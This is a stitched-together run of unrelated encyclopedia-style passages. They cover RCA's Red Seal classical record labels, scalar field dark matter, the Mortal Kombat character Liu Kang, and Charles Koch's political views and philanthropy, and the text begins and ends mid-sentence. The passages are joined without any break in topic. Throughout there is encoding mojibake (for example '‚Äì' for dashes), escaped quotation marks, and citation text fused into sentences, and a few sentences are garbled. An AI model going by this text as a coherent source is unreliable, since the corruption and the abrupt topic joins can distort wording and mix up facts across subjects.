good medium for capturing the sound of singing voices, male voices especially, but while acceptable solo piano and violin recordings could be made, the acoustical process typically yielded only a flat, muffled, tinny echo of a symphony orchestra. The introduction of electrical recording (or \\"orthophonic recording\\", as Victor termed its version of the process) in 1925 allowed reproduction of instrumental and orchestral music with greatly improved fidelity. In 1929, the Radio Corporation of America purchased the Victor Talking Machine Company, thereafter becoming RCA Victor and, in 1968, RCA Records. RCA Victor's Red Seal series continued as the pre-eminent classical music record label in America from 1903 through the 1960s due in large part to the recordings of three of the leading conductors of the time, Serge Koussevitzky, Leopold Stokowski, and Arturo Toscanini. Nearly all of Toscanini's recordings were issued on the Red Seal label, most of them with the NBC Symphony Orchestra (NBC was an RCA subsidiary until 1986). Conductor Arthur Fiedler and the Boston Pops Orchestra spent nearly 35 years with RCA Victor and made many best-selling Red Seal recordings. Stokowski and the Philadelphia Orchestra made Red Seal records exclusively from 1917 until 1940. Stokowski would continue to make many other Red Seal recordings with various orchestras, sporadically until 1975. Eugene Ormandy made his first recordings with the Minneapolis Symphony Orchestra in 1934 and with the Philadelphia Orchestra beginning in 1936. Ormandy and the Philadelphians returned to RCA Victor in 1968, after spending 23 years (1944‚Äì67) with Columbia Records. Though best-known for his many recordings for Columbia and Deutsche Grammophon, Leonard Bernstein made his first recordings for RCA Victor. In 1950, RCA Victor began issuing vinyl LPs (originally introduced by Columbia Records in 1948), because they were losing artists and sales due to the company's resistance to adopting the new format. In 1954, RCA Victor began experimenting with stereophonic recording. The first RCA Victor \\"Stereo Orthophonic\\" reel to reel tapes were issued in 1955. When stereo LP records first appeared in 1958, RCA Victor introduced their highly regarded \\"Living Stereo\\" recordings. During this period RCA was consistently seen as producing some of the finest-sounding recordings then available. In 1968, RCA introduced a modern logo, de-emphasized the Victor name and \\"His Master's Voice\\" trademarks, and the label was now known as \\"RCA Red Seal\\". In 1976, RCA restored the \\"His Master's Voice\\" trademark to most of its record labels, including the Red Seal label. After General Electric absorbed the RCA Corporation in 1986 and sold its interest in RCA Records to the Bertelsmann Music Group, the Victor name was revived so the label once again became \\"RCA Victor Red Seal\\" for several years before eventually de-emphasizing the Victor and \\"His Master's Voice\\" trademarks again, and reverting to \\"RCA Red Seal\\" in the early 2000s due to the worldwide fragmented ownership of the \\"His Master's Voice\\" trademark.  Some Red Seal recording artists  The following instrumentalists, vocalists, conductors and orchestras have all made Red Seal recordings. Some recordings were made for other overseas companies but were distributed in the US on the Red Seal label. Many have also recorded or may be currently recording for other labels. Gold Seal The RCA Gold Seal mid- priced label was launched in 1975 and initially consisted mainly of reissues of \\"Living Stereo\\" recordings from the late 1950s and 1960s previously issued on the Red Seal label. Beginning in the 1980s, many older monophonic Red Seal recordings from the 78 RPM and early LP era were reissued on the Gold Seal label. Included were recordings by \\"Golden Age\\" opera stars such as Enrico Caruso, Nellie Melba, Amelita Galli-Curci, Ezio Pinza and Rosa Ponselle, as well as renowned virtuosos like Vladimir Horowitz, Arthur Rubinstein, Jascha Heifetz and Wanda Landowska. In the compact disc era, the RCA Victor Gold Seal mid-priced label superseded the RCA Victrola label for reissuing historic Red Seal recordings; The Victrola label now issued budget-priced stereo recordings on CD and cassette of the standard classical repertoire drawn from former Red Seal issues. Gold Seal released complete boxed sets of recordings by Arturo Toscanini, Fritz Kreisler and Sergei Rachmaninoff, among others. Silver Seal In the early 1990s, another budget reissue label, RCA Victor Silver Seal was launched. Similar to CD reissues on the RCA Victrola label, several of these former Red Seal recordings were by lesser known performers, but the series also included some popular long-time Red Seal artists, including conductors Leopold Stokowski, Charles Munch and Zubin Mehta; pianists Byron Janis, Alexis Weissenberg and Emmanuel Ax; the Guarneri Quartet and guitarist Julian Bream. Recordings in this series were available only on CD and cassette and did not contain liner notes.

Ordinary matter is divided into luminous matter (the stars and luminous gases and 0.005% radiation) and nonluminous matter (intergalactic gas and about 0.1% neutrinos and 0.04% supermassive black holes). Ordinary matter is uncommon. Modeled after Ostriker and Steinhardt.Jeremiah P. Ostriker and Paul Steinhardt New Light on Dark Matter For more information, see NASA. In astrophysics and cosmology scalar field dark matter is a classical, minimally coupled, scalar field postulated to account for the inferred dark matter. Background The universe may be accelerating, fueled perhaps by a cosmological constant or some other field possessing long range ‚Äòrepulsive‚Äô effects. A model must predict the correct form for the large scale clustering spectrum,Galaxies are not scattered about the universe in a random way, but rather form an intricate network of filaments, sheets, and clusters. How these large-scale structures formed is at the root of many key questions in cosmology. account for cosmic microwave background anisotropies on large and intermediate angular scales, and provide agreement with the luminosity distance relation obtained from observations of high redshift supernovae. The modeled evolution of the universe includes a large amount of unknown matter and energy in order to agree with such observations. This energy density has two components: cold dark matter and dark energy. Each contributes to the theory of the origination of galaxies and the expansion of the universe. The universe must have a critical density, a density not explained by baryonic matter (ordinary matter) alone. Scalar field The dark matter can be modeled as a scalar field using two fitted parameters, mass and self- interaction. In this picture the dark matter consists of an ultralight particle with a mass of ~10‚àí22 eV when there is no self-interaction. If there is a self-interaction a wider mass range is allowed. The uncertainty in position of a particle is larger than its Compton wavelength (a particle with mass 10‚àí22 eV has a Compton wavelength of 1.3 light years), and for some reasonable estimates of particle mass and density of dark matter there is no point talking about the individual particles‚Äô positions and momenta. Ultra- light dark matter would be more like a wave than a particle, and the galactic halos are giant systems of condensed bose liquid, possibly superfluid. The dark matter can be described as a Bose‚ÄìEinstein condensate of the ultralight quanta of the field and as boson stars. The enormous Compton wavelength of these particles prevents structure formation on small, subgalactic scales, which is a major problem in traditional cold dark matter models.

Following his victory in the tournament, Liu Kang becomes the Mortal Kombat series' primary protagonist as the champion and chief defender of Earthrealm guided by his mentor, the thunder god Raiden and has appeared in most titles. Designed with special moves intended to be easier to perform than the moves of other characters, Liu Kang has appeared in many of the Mortal Kombat fighting installments, in addition to starring with Kung Lao as the title characters of the action-adventure game Mortal Kombat: Shaolin Monks, and being among the eleven series characters representing the franchise in the crossover game Mortal Kombat vs. DC Universe. Liu Kang has extensively featured in alternate Mortal Kombat media and official merchandise, serving as the primary protagonist of the two feature-length films and the Malibu Comics comic book adaptations, in addition to supporting roles in other media such as the 1995 Mortal Kombat novel and the animated series Mortal Kombat: Defenders of the Realm. Critical and general reception of the character has been mainly favorable, although various aspects have been criticized. While some less gory skills have been criticized for lacking the appeal of other characters' finishing moves, as well as the sounds he yells during regular attacks, Liu Kang's darker characterization in the later games has been praised while his development in Mortal Kombat 11 was also well received for his growth. Design and development Liu Kang was originally going to be a Japanese character called Minamoto Yoshitsune,Ok... I just found thee very first MK related art I ever did!!! You'll never guess which character it was... by John Tobias on Twitpic.More doodles from my ancient MK notebook. JohnnyCage B4 he was JohnnyCage and Yoshitsune Minamoto‚Ä¶ by John Tobias on Twitpic. but Mortal Kombat co-creator and character designer John Tobias stated that the staff could not \\"deal with the name.\\" According to Tobias, whose favourite character in the series is Liu Kang, he \\"was originally going to be a traditional monk - bald and in robes - but he wound up resembling Bruce Lee.\\" According to Tobias, Liu Kang was purposely the only character that voiced his finishing move in the original game, and was \\"the best\\" in the first sequel. The 1973 film Enter the Dragon was a major influence in Liu Kang's story. The name Liu Kang was inspired by Gordon Liu, an actor famous for the film The 36th Chamber of Shaolin. Liu Kang was the only character in the first game whose finishing move (Fatality) did not explicitly murder his opponent, and also without the background dimming. This was because Liu Kang was depicted therein as a Shaolin monk, who in general have strict beliefs regarding killing and murder. However, starting with Mortal Kombat II, he was given gory Fatalities as he was thereafter depicted as a renegade monk who decided to grow his hair back, and who had \\"strong Shaolin beliefs, but was no longer a part of the Shaolin monks.\\" In response to rumors that Liu Kang would die in Mortal Kombat II and therefore not make it into Mortal Kombat 3, Boon said, \\"It'd be like doing part three of Star Wars and not having Luke Skywalker in there. You don't do that.\\" His eventual death caused Dan Forden, the music composer of the series, to make a \\"funeral song\\" for Liu Kang as he felt saddened by his death. The track titled \\"Liu Kang's Tomb\\" would be used in Mortal Kombat: Deception in the arena that shows his tomb. Liu Kang was played by Ho-Sung Pak in the first two games. John Tobias originally intended for the character to be a traditional bald monk, but the actor refused to shave his head. In the first game, Liu Kang was modeled after Bruce Lee, as he had short hair and went shirtless, with a threadbare outfit of only black pants and white shoes. In Mortal Kombat II, his outfit was enhanced with red stripes, and now included a red headband, black shoes, and studded wristguards (the intro of MKII shows the younger version of the character defeating Shang Tsung in the background, while the updated character is in the foreground). In Mortal Kombat 3, his hair was considerably longer, with the only alteration to his outfit being thin black leg strips wrapped above his ankles in order to give him a \\"sleeker\\" look for the game. He was given a red tank top in addition to his usual costume in Mortal Kombat 4, but his alternate outfit was blue and featured him shirtless again. His wardrobe from the third game was carried over into Deception and Armageddon, but due to his resurrection, his skin was ash gray, and he wore hooked chains around his wrists. This form is also known by fans and Mortal Kombat producer Shaun Himmerick as \\"Zombie Liu Kang\\". Nevertheless, his alternate outfit for both games featured him as a living person in order to contrast his undead form. In Mortal Kombat vs. DC Universe, he sported a slightly altered version of his third costume, in addition to a championship belt adorned with the Mortal Kombat dragon emblem. Although Liu Kang's design in Mortal Kombat: Shaolin Monks remains similar to his Mortal Kombat II one, Himmerick said that it was the most revised one from the game, along with Kung Lao's. Voice actor Tom Choi played the character in Mortal Kombat VS DC Universe until Mortal Kombat X. He took pride for doing the acting for Liu Kang, claiming it as important as the film Minority Report. While calling it as a typical work, Choi was pleased with the positive critical response the game got as it would open up ideas for a sequel. Had Tobias continued to work on Mortal Kombat beyond 1999, he would have continued to center the plot around Liu Kang and then his son. Liu Kang returned as the protagonist of Mortal Kombat 11 with Boon stating that the main theme of the game was \\"redemption\\". This is explored through the story mode where Liu Kang and Kung Lao's past selves confront their corrupted future selves and thus confront their own sins. Boon found interesting exploring more the villains' side of the cast. Boon further referred to the heroic one as the \\"epytomy of hero\\"Matthew Yang King voiced Liu Kang in the Mortal Kombat 11, a role he enjoyed to do. =Gameplay= A screenshot of Liu Kang's recurring left As stated on his Mortal Kombat: Armageddon bio card, Ed Boon mentioned that Liu Kang was designed to be the most easily \\"accessible\\" character, meaning that both casual and experienced gamers could play as him with little difficulty. Liu Kang specializes in kicks, with his most common move being flying across the screen and connecting with a kick to the opponent's torso. Another such move is the \\"Bicycle Kick\\" in which Liu Kang flies across the screen with a series of multiple kicks to the opponent's torso resembling pedaling a bicycle, hence the name. A different kind of his signature abilities is the \\"Dragon Fire\\": with it Liu Kang sends a fiery flame in the shape of a Chinese dragon across the screen out of his hands at his opponent. After Mortal Kombat II, he gains the ability to perform this while crouching and in the air, also for Deception and Armageddon. The developers made Liu Kang immediately selectable in Mortal Kombat: Unchained, the PlayStation Portable port of Deception, as they noted that unlocking him in Deception had proved difficult. Liu Kang's Fatality from the original game is the \\"Shaolin Uppercut\\", invented by Ho-Sung Pak, in which he performs a butterfly kick (often mistaken for a cartwheel) on his opponent before hitting an uppercut that knocks them offscreen before landing. Originally a glitch, John Tobias remembers the reason for Shaolin Uppercut not changing the background was to symbolise Liu Kang's noble motivations. In Mortal Kombat: Shaolin Monks, there were two versions; one where the victim explodes into pieces upon impact and the original, in which the opponent is torn to pieces upon falling to the ground. In another signature Fatality, he morphs into a large dragon, chomping the upper body of his opponent. This Fatality was turned into an Animality in Mortal Kombat 3 and back into a normal Fatality in Mortal Kombat 4. In the Game Boy and Game Gear versions of Mortal Kombat II, the dragon torches the opponent with fire instead. The series' composer and co-designer John Vogel noted it to be his favorite Fatality due to how much Liu Kang's appearance changes. Another famous Fatality of Liu Kang has him vanish and a Mortal Kombat arcade game machine drop down and crush his opponent. According to GameSpy's MK2011 walkthrough, Liu Kang \\"inflicts better damage\\" than Kung Lao \\"by jumping around like a lunatic and kicking the crap out of everything he sees.\\" Appearances =In video games= In Midway Games Introduced in the first Mortal Kombat game as a Chinese Shaolin Kung Fu fighting monk, Liu Kang enters the tenth Mortal Kombat tournament in order to protect Earthrealm from being destroyed after having lost the previous nine tournaments. He defeats Grand Champion Goro and the tournament host, the nefarious sorcerer Shang Tsung, and emerges as the new Mortal Kombat champion. In the 1993 sequel Mortal Kombat II, Liu Kang finds many of his Shaolin brethren killed in a vicious attack by a horde of nomadic mutants led by Baraka under orders from the evil Outworld emperor Shao Kahn, Shang Tsung's master. Enraged, Liu Kang decides to travel to Outworld to seek revenge, backed by friend and fellow Shaolin Kung Lao. At the tournament, Liu Kang defeats Shao Kahn. In Mortal Kombat 3 (1995), Liu Kang and his friends fight against Shao Kahn's extermination squad which invaded Earthrealm. He once again defeats the Emperor, causing him and his forces to retreat back to Outworld. In the events of Mortal Kombat 4 (1997), Liu Kang discovers that his lover and ally, Princess Kitana, has been captured by the disgraced Elder God Shinnok's forces, and begins gathering Earth's warriors to defeat him. Liu Kang confronts Shinnok and once again emerges victorious with Kitana and her people having survived to the attack, but he is unable to commit himself to a relationship due to his duty as Earthrealm's champion while Kitana has to remain in Outworld to rule her kingdom. Liu Kang becomes unplayable for the first and only time in the Mortal Kombat series in 2002's Mortal Kombat: Deadly Alliance, in which the titular partnership of Shang Tsung and fellow sorcerer Quan Chi join forces to kill him in the game's introductory sequence. In the events of Mortal Kombat: Deception (2004), an unknown party reanimates Liu Kang's corpse and sends it on a murderous rampage, causing Liu Kang's soul to attempt to control it. He returns as a playable character in this game, albeit in undead form and as a secret character that can only be unlocked by completing the game's Konquest Mode. His spirit enlists the reformed ninja Ermac to try to save Kitana and his Earthrealm allies from the Dragon King Onaga. Liu Kang is still unable to fully regain control of his body in Mortal Kombat: Armageddon (2006), where he is playable along with the entire series roster and in which it is revealed that Raiden had revived Liu Kang's corpse in Deception. Liu Kang's bond with Kitana had succeeded in keeping his power in check, with Nightwolf then assuming her position as Liu Kang's \\"spiritual anchor\\" in attempt to find a way to reunite his body and soul, which he accomplishes in his ending. Along with Kung Lao, Liu Kang is the lead character in the 2005 spin-off action-adventure game Mortal Kombat: Shaolin Monks. The game is a retelling of the storyline of the events leading up to Mortal Kombat II, and features the two Shaolin monks traveling to Outworld to find and defeat Shang Tsung, later ending in a fight with Shao Kahn and rescuing Kitana along the way. He is among the eleven characters representing the Mortal Kombat franchise in the 2008 crossover title Mortal Kombat vs. DC Universe, which features fights between characters from the Mortal Kombat and the DC Comics universes. In this game, Liu Kang appears as the protagonist of the first chapter of the Mortal Kombat story mode. Tobias said that the fight he expected to see in the game was between Liu Kang and Batman as he noted their back-stories to be very similar, due to fact, both Liu Kang and Batman are fought in Raiden and Superman's chapters respectively, trying to snap their rage influenced respective leaders back to their sense from killing the leader's respective arch-enemies, Lex Luthor and Shang Tsung, reminding them that Dark Kahn is their true enemy. NetherRealm Studios titles In the 2011 Mortal Kombat reboot video game, Liu Kang reprises his role from the first three tournaments as one of Raiden's chosen warriors. Despite his victory over Shang Tsung in the recreation of the first game, Raiden starts having visions of Kahn cathastropic visions which leads to Kung Lao taking Liu's role. However, Kung Lao is killed by Kahn and Liu Kang nearly kills his nemesis in revenge. Following his recovery, when Shao Kahn is preparing to invade Earthrealm during the third game's events, all of Liu Kang's allies are murdered by a soul-infused Sindel. This, coupled with Raiden's failed attempts in changing the future, causes Kang to grow more and more disillusioned with Raiden, engaging him in combat. In the alternate timeline, Liu Kang is accidentally killed by his mentor, Raiden when he tries to stop him from facing Kahn. Liu Kang returns in Mortal Kombat X. In the game's story mode, Quan Chi resurrects him as a revenant to serve him. He fights Jax and Raiden, blaming the latter for his death. His and Kung Lao's past selves are also explored when Raiden remember the events of the previous game. Following Quan Chi's death and Shinnok's defeat, he and Kitana become the new rulers of the Netherrealm. They are visited by Raiden, who brings them Shinnok's disembodied head as a warning for them not to attack Earthrealm. In Mortal Kombat 11, Liu Kang has been further corrupted by Shinnok's influence and planned to invade Earthrealm. After Raiden and the Special Forces destroy his castle in the Netherrealm, Liu Kang and his allies join the keeper of time, Kronika, in forging a new timeline without Raiden. While making preparations however, she created a time storm that brought a younger version of Liu Kang to the present. Despite learning of what happened to him and an encounter with his revenant, Liu Kang continues to trust Raiden and aligns himself with Earthrealm's warriors. When he clashes with Raiden after the latter uses Shinnok's amulet to strengthen himself, the thunder god discovers that Kronika manipulated them into fighting across multiple different timelines as she fears their combined power. Kronika kidnaps the past Liu Kang so his revenant can absorb his soul. Rather than kill him, Raiden merges with the revenant and younger Liu Kang, transforming them into \\"Thunder Fire God Liu Kang\\". With Raiden's godly powers and his revenant counterpart's knowledge of Kronika's plan, he storms Kronika's keep and engages her in battle. In the game's bad ending, Kronika kills Liu Kang and ushers in her New Era. In one of two good endings, Liu Kang defeats Kronika and is either joined by a mortal Raiden or Kitana in shaping a new timeline. In the DLC story expansion Aftermath, Liu Kang and Raiden attempt to restart history, only to be interrupted by Shang Tsung, who tells them they need Kronika's Crown of Souls in order to do so. The sorcerer has the Thunder Fire God send him back in time to retrieve a past version of the Crown. While Shang Tsung is successful in retrieving the Crown, he reneges on the deal and attempts to restart history for himself after defeating Kronika. However, he discovers that Liu Kang had manipulated events to ensure his victory, having known that the sorcerer would betray him from the beginning. In the expansion's bad ending, Shang Tsung kills Liu Kang. In the good ending, Liu Kang erases Shang Tsung from history and, in the process of forging his New Era, visits Kung Lao's ancestor to give him special training for his future battles. =Other appearances= Printed media Liu Kang was the hero of the comic book adaptation of the Mortal Kombat series Malibu Comics. In the first miniseries, Blood and Thunder, his backstory was mostly kept intact as a Shaolin monk out to restore the tournament to their righteous owners, with the only difference being that he was not the chosen one to defeat Goro, which instead fell on twin monk brothers named Sing and Sang, two original characters created specifically for the comics; after they are killed by Goro in the third issue, Liu Kang becomes the Shaolin's only hope in defeating Shang Tsung. The following miniseries, Battlewave, stated that Liu Kang won the first tournament after defeating Goro, which never appeared in the first miniseries. He returns to his normal life as an architect in Chicago, having left the Order of Light before the events of the first series. However, he suffers from constant attacks by an unknown force of ninjas and later receives help from Johnny Cage's bodyguard Bo when Goro ambushes him in an office building. Eventually he decides to travel to Outworld, realizing that he cannot avoid Mortal Kombat. In the Midway Comics, Liu Kang reprises his role from the first game's prologue, focusing first on dealing with the criminal Kano. Mortal Kombat II Collector's Edition starts with Liu Kang winning the first tournament and then meeting the ninja Sub-Zero in the aftermath. When clashing the other realm's forces, Raiden instructs Liu Kang to enter into the next competition. A prologue of Mortal Kombat 4 was also written, dealing with Liu Kang and his new ally Kai as they prepare to face Shinnok's forces. Live action adaptations Liu Kang is the main protagonist of both Mortal Kombat films, where he is portrayed by Robin Shou. Director Paul W. S. Anderson wanted Liu Kang's character to be \\"really engaging\\" and chose Shou, noting his skills with martial arts. Anderson compared Shou with Jackie Chan due to how both actors did not rely on stunts for their movies and thus made his fight with Reptile one of his favorites. In the first film, he takes part in the tournament out of guilt over his brother's death at the hands of Shang Tsung (portrayed by Cary-Hiroyuki Tagawa), and defeats Tsung in the final battle. As a result of the film's style the relationship between Liu Kang and Kitana is more of a metaphysical than a romantic nature. Shou stated that the fight he had with Reptile was the most memorable as he got his ribs wounded in one of the takes where Reptile's character kicked Liu Kang towards a pillar. This take was the one used in the movie with Shou explaining viewers would notice his pain when the fight begins. In retrospective, Shou comments that the production team managed to \\"find Liu Kang\\" during the making of the feature, with Shou's facial expressions fitting their criteria. Shou and Talisa Soto (Kitana) were the only two actors to reprise their roles in the sequel, Mortal Kombat: Annihilation. In the sequel, Liu Kang joins the Earthrealm warriors to stop Shao Kahn's menace. In the 1995 animated film Mortal Kombat: The Journey Begins, Liu Kang appears as one of the main characters. Liu Kang appears in the 2013's second season of the web series Mortal Kombat: Legacy, portrayed by Brian Tee. Liu Kang in Legacy is portrayed as an anti-hero and fighting on the side of Outworld rather than that of Earthrealm in the web series. In this version, he is shown to have left a monastery to live a normal life working at a diner with a fianc√©e. After watching a pair of thieves kill her in a robbery attempt, he becomes consumed with anger and revenge, and further distances himself from Kung Lao and the ideals that were taught to him. After working as a freelance assassin for a few years, he is approached by Shang Tsung, who convinces him that humanity is not worth protecting and asks him to join the realm of Outworld in the upcoming Mortal Kombat tournament, which he agrees to. During the tournament, he easily subdues Johnny Cage and Kurtis Stryker before being confronted by Kung Lao, who is surprised at his old friend's change of allegiance. In 2019, it was announced that Ludi Lin will portray Liu Kang for the 2021 reboot of the film series. Other media Liu Kang is one of the lead characters in the 1996 animated series Mortal Kombat: Defenders of the Realm, voiced by Brian Tochi. He is not the protagonist therein as opposed to the game storyline, instead sharing this role with several other Earthrealm heroes. In 1996, Toy Island published a Liu Kang action figure which had a white shirt. Two Liu Kang action figures from Shaolin Monks were released by Jazwares. Apart from being flexible, both figures included different types of weapons such as swords and axes. Jordan Rodrigues voiced the role of Liu Kang who appeared as one of the lead characters in the 2020 animated movie Mortal Kombat Legends: Scorpion's Revenge. He, Sonya and Cage reprise their role from the first Mortal Kombat game with Scorpion's aid. Liu Kang is also mentioned in the song by Wale \\"My Love\\" (feat. Major Lazer, WizKid, and Dua Lipa). Reception The character has received mostly very positive response by gaming publications. Liu Kang topped UGO Networks' 2012 list of the top fifty Mortal Kombat characters and placed 94th on their 2008 list of the \\"top 100 heroes of all time\\".Top 100 Heroes of All Time. UGO.com. Retrieved on December 13, 2008.GameSpot featured him in their 2009 poll for the title of \\"All Time Greatest Game Hero\\", in which he lost to Yoshi. In 2012, GamesRadar ranked him as 51st \\"most memorable, influential, and badass\\" protagonist in games, adding that while \\"Sub-Zero and Scorpion may get most of the fanfare\\", Liu Kang \\"can shoot fireballs, whoops and hollers just like Bruce Lee, and pioneered the Animality with his dragon-transformation fatalityit‚Äôs no wonder that Liu Kang‚Äôs the chosen champion of Earthrealm.\\"100 best heroes in video games , GamesRadar, October 19, 2012. DigitalSpy listed him as the 13th best Mortal Kombat character comparing him with Street Fighter character Ryu, stating they while both are \\"kind of dull\\", they develop appealing techniques across their respective series. Complex listed Liu Kang as the third best character in the franchise based on his heroic traits, moves as well as his undead form. His relationship with Kitana was ranked fourth in IGN's list of best video game couples in 2006. Like all the characters from Mortal Kombat vs. DC Universe, Liu Kang was selected to be a playable character based on his popularity. Jesse Schedeen of IGN said that \\"it just wouldn't be right having a game without [Liu Kang],\\" noting him to be as fierce as the DC Universe characters in this game. In 2010, GamePlayBook ranked Liu Kang as the second best Mortal Kombat character, commenting that \\"his nimbleness and fighting expertise make him an ideal pick\\" and how he is as good as zombie as when he was alive. Fire God Liu Kang earned praise for his development in the narrative and actions in Mortal Kombat 11. Upon his death in Deadly Alliance, IGN's Jeremy Dunham noted that Liu Kang was killed as the series needed \\"'starting over' mentality\\", as he regarded Liu Kang as the series' strongest character. Complex remarked that the Mortal Kombat developers \\"finally found their groove again with Deadly Alliance, which began by snapping Liu Kang's neck.\\" Game Informer listed his death in their article about \\"characters that died under our watch\\" calling it a \\"shock\\" as Liu Kang was stated to be one of the \\"most loved\\" characters from the series. His redesign in Mortal Kombat: Deception was praised by GameSpot for being one of the best ones from the title, and was featured in GamesRadar's list of the \\"greatest zombie triumphs\\" in 2009, but was also ranked as the ninth-worst Mortal Kombat character by ScrewAttack in 2011.ScrewAttack Video Game, Top 10: Worst Mortal Kombat Kharacters , ScrewAttack's Top 10, GameTrailers.com, 04/30/2011. Additionally, GamesRadar used Liu Kang as an example of a stereotype of gaming heroes who reveal an evil alter ego that ruins the character's appealing traits, and considered him to be \\"a little like the Shaolin version of Goku, in that he's saved his world countless times and come back from the dead even more frequently.\\" GamesRadar featured him, Fei-Long and Tekken's Marshall Law in the article about \\"kickass Bruce Lee clones\\" citing his similarities with Bruce Lee and with one of his shouts featured in famous quotes. Liu Kang's darker characterization starting with Deception and in the reboot were received with good critical response as Den of Geek listed him as the 22nd best Mortal Kombat character due to this aspect. Both Den of Geek and Hardcore Gamer found Liu Kang's possible role in the series to be shrouded in mystery due to his possible revival as a villain as well as how he is not available to face Shinnok as in the first games created for the series. In regards to his and Kitana's role in Mortal Kombat 11, Escapist Magazine found it confusing as a result of Liu Kang's transformation into a god and the couple becoming rulers of time. Game Revolution enjoyed Liu Kang's ending in the Mortal Kombat 11 and thus wondered which of his two endings where he allies with either Raiden or Kitana would be taken as canonical. GamesPCN found Liu Kang's development in the game touching due to the handling of his character to the point gamers looked forward to his best ending which was difficult to achieve. Upon God Liu Kang's inclusion in the game as playable, Game Revolution compared it with Ryu's evil persona from Street Fighter. Both Shack News and Even Thubs enjoyed the actions Liu Kang makes as a God due to the major direction the narrative takes in the DLC Aftermath as he aims to restart the generation. Den of Geek commented that Liu Kang's role as a protagonist in Mortal Kombat 11 was well handled as he fitted the heroic role through his transformation into the God of Fire and Lightning. =Gameplay and finishing moves= Liu Kang's famous finishing move of turning into a dragon was ranked by ScrewAttack as the second best in the series, referred to as the most iconic Fatality in Mortal Kombat II, but his cartwheel Fatality from the original Mortal Kombat was ranked by ScrewAttack as the second worst in the series. Liu Kang's dragon Fatality has been listed as one of the best Fatalities from the series by both Game Informer and UGO in 2010, as well as by Complex in 2013. On the other hand, his Fatality in which he drops a Mortal Kombat arcade machine onto his opponent were pointed by both Game Informer and GamePro as one of the worst from the series, even as GamesRadar listed it among the reasons of Liu Kang being \\"boss\\". Some video game publications criticized his gameplay and shouts while others noted him to be entertaining. IGN's Douglas Perry wrote that he preferred Liu Kang over Kung Lao as a playable character in Shaolin Monks because of his \\"intuitive fighting moves,\\" adding that his shouts were \\"annoying\\" yet \\"strangely pleasing.\\" GameDaily too complained about his voice, saying that \\"Liu Kang screams out like a chicken,\\" and GamesRadar wrote that \\"the strange squeals he emits during his trademark Bicycle Kick move are unforgettable.\\" Nevertheless, Mary Shearman from 100 Entertainers Who Changed America: An Encyclopedia of Pop Culture considered that Bruce Lee himself used to make animal noises when attacking.

He is a member of the Mont Pelerin Society.Koch's bio at the Mercatus Center Political and economic views Charles Koch describes himself as a classical liberal and has formerly identified as a libertarian. He is opposed to corporate welfareThe Koch Brothers December 24, 2012 p. 96 Forbes and told the National Journal that his \\"overall concept is to minimize the role of government and to maximize the role of private economy and to maximize personal freedoms.\\"National Journal (May 16, 1992) He has expressed concern for too much government regulation in the U.S., stating that \\"we could be facing the greatest loss of liberty and prosperity since the 1930s.\\"The Top 10 Forbes Asia October 19, 2009. In addition, he has warned that drastic government overspending and a decline of the free enterprise system will prove detrimental to long-term social and economic prosperity. According to Stephen Moore, influences on Koch include Alexis de Tocqueville,Koch, Charles, The Science of Success, p. 57 Adam Smith, Michael Polanyi, Joseph Schumpeter, Julian Simon, Paul Johnson, Thomas Sowell, Charles Murray, Leonard Read, and F.A. Harper. The presidents he most admires include George Washington, Grover Cleveland, and Calvin Coolidge. In an interview with the American Journal of Business, Koch said he owes \\"a huge debt of gratitude to the giants who created the Austrian School [of economics]. They developed principles that enabled me to gain an understanding of how the world works, and these ideas were a catalyst in the development of Market-Based Management.\\" In particular, he expresses admiration for Ludwig von Mises' book Human Action, as well as the writings of Friedrich Hayek. Koch said \\"the short-term infatuation with quarterly earnings on Wall Street restricts the earnings potential of Fortune 500 publicly traded firms.\\" He also considers public firms to be \\"feeding grounds for lawyers and lawsuits,\\" with regulations like Sarbanes‚ÄìOxley only increasing the earnings potential of privately held companies. Koch disdains \\"big government\\" and the \\"political class.\\" He believes billionaires Warren Buffett and George Soros, who fund organizations with different ideologies, \\"simply haven't been sufficiently exposed to the ideas of liberty.\\" Koch claimed \\"prosperity is under attack\\" by the Obama administration and sought to warn \\"of policies that threaten to erode our economic freedom and transfer vast sums of money to the state.\\" In an April 2011 Wall Street Journal op-ed, Koch wrote: > Government spending on business only aggravates the problem. Too many > businesses have successfully lobbied for special favors and treatment by > seeking mandates for their products, subsidies (in the form of cash payments > from the government), and regulations and tariffs to keep more efficient > competitors at bay.

His opposition to corporate welfare includes lobbying for the end to ethanol subsidies even though Koch Industries is a major ethanol producer. He is quoted as saying: \\"The first thing we've got to get rid of is business welfare and entitlements.\\" In an April 2014 Wall Street Journal op-ed, Koch wrote, \\"the fundamental concepts of dignity, respect, equality before the law and personal freedom are under attack by the nation's own government.\\" He criticized the Obama Administration, saying that its \\"central belief and fatal conceit\\" is that people are not capable of running their own lives. \\"This is the essence of big government and collectivism,\\" he wrote. He cited the \\"current health care debacle\\" as an example of disastrous government control. He complained that he had been the victim of \\"character assassination.\\" =Market-based management= Koch's business philosophy, \\"market-based management\\" (MBM), is described in his 2007 book The Science of Success. In an interview with the Wichita Eagle, he said that he was motivated to write the book by Koch Industries' 2004 acquisition of Invista so he could give new employees a \\"comprehensive picture\\" of MBM. According to the website of the Market-Based Management Institute, which Koch founded in 2005, MBM is \\"based on rules of just conduct, economic thinking, and sound mental models\\", harnessing the dispersed knowledge of employees just as markets harness knowledge in society. \\"It is organized in and interpreted through five dimensions: vision, virtue and talents, decision rights, incentives, and knowledge processes.\\"What is MBM? www.mbminstitute.org. Retrieved April 2011. In the book, Koch attempts to apply F. A. Hayek's spontaneous order theory and Austrian entrepreneurial theory, such as that of Mises and Israel Kirzner, to organizational management. Philanthropic and political activities Koch funds and supports libertarian and free-enterprise policy and advocacy organizations. In 1977 he co-founded, with Edward H. Crane and Murray Rothbard, the Cato Institute. He is a board member at the Mercatus Center, a market-oriented research think tank at George Mason University. In 2008, Koch was included in Businessweek's list of top 50 American givers. Between 2004 and 2008, Koch gave $246 million, focusing on \\"libertarian causes, giving money for academic and public policy research and social welfare.\\" Koch was awarded an Honorary Doctorate from George Mason University in recognition of his financial support \\"through scholarships, faculty recruitment, and research grants\\".Charles Koch receives honorary degree from George Mason University www.kochind.com. Retrieved April 2011. A leaked 2012 fundraising plan indicated that the Charles G. Koch Charitable Foundation contributed $25,000 in 2011 to The Heartland Institute, an American conservative and libertarian public policy think tank. Koch's philanthropic activities have focused on research, policy, and educational projects intended to advance free-market views. He has underwritten scholarships and financed the research of economists such as James Buchanan and Friedrich Hayek. He has also \\"supported efforts to inspire at-risk young people to consider entrepreneurship, to teach American students the principles of limited government, and to connect recent graduates with market-oriented organizations, in an effort to launch their careers in public policy.\\" Two works that have been especially influential upon Koch's philosophy are Ludwig Von Mises' Human Action and F. A. Harper's 